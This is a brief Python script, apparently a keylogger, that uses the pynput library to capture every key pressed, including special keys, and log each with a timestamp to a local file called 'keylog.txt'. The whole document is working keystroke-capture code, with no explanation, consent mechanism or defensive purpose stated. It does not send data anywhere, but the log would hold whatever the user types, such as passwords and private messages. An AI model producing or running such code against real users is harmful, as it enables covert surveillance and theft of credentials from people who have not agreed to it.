
# Import from pynput and keyboard
from pynput import keyboard
import logging

# Set log file path
log_file = 'keylog.txt'

# Configure logging
logging.basicConfig(filename=log_file, level=logging.DEBUG, format='%(asctime)s: %(message)s')

def on_press(key):
    try:
        logging.info(f'Key pressed: {key.char}')
    except AttributeError:
        logging.info(f'Special key pressed: {key}')

# Start listener
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()